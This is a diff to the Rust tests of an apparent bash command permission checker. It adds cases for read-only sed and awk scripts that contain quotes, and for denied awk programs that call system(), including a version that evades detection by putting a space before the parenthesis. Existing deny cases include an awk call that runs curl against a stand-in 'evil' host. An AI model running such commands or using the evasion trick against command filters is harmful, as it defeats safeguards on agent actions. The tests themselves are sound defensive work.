@@ -360,6 +360,10 @@ mod tests {
             "git log | awk '{print $1}'",
             "cat f | sed 's/a/b/'",
             "sed 's/a/b/g' f | grep x",
+            // Code-critic re-review MEDIUM: an apostrophe/single-quote inside
+            // a double-quoted read-only script must not be over-denied.
+            r#"sed "s/can't/cannot/" f"#,
+            r#"awk -F"'" '{print $2}'"#,
         ] {
             assert_eq!(
                 evaluate_bash_command(cmd),
@@ -377,6 +381,12 @@ mod tests {
         for cmd in [
             r#"awk 'BEGIN{system("touch /tmp/x")}'"#,
             r#"awk 'BEGIN{system("curl https://evil/x")}'"#,
+            // Code-critic re-review CRITICAL: AWK tolerates whitespace
+            // between a builtin name and its `(` — `system ("...")` (space)
+            // executes exactly like `system("...")` and was missed by a
+            // no-space-only substring check.
+            r#"awk 'BEGIN{system ("touch /tmp/x")}'"#,
+            "awk 'BEGIN{system\t(\"echo x\")}'",
             // A co-process pipe/read inside the awk program is itself a
             // bare `|`/`;` from the (quote-unaware) segment splitter's point
             // of view, so it fragments the quoted program and leaves an
